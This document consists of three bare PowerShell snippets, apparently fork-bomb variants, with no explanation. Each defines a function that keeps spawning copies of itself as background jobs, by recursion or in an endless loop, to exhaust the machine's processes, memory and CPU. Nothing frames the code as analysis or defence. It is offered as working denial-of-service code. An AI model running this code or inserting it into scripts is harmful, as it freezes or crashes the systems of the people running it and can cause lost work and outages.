~~~powershell
function f { f | Start-Job -ScriptBlock { f } }; f
~~~

~~~powershell
function f { f | Start-Job -ScriptBlock ${function:f} }; f
~~~
~~~powershell
function f { Start-Job -ScriptBlock ${function:f} | Out-Null }; do { f } while ($true)
~~~



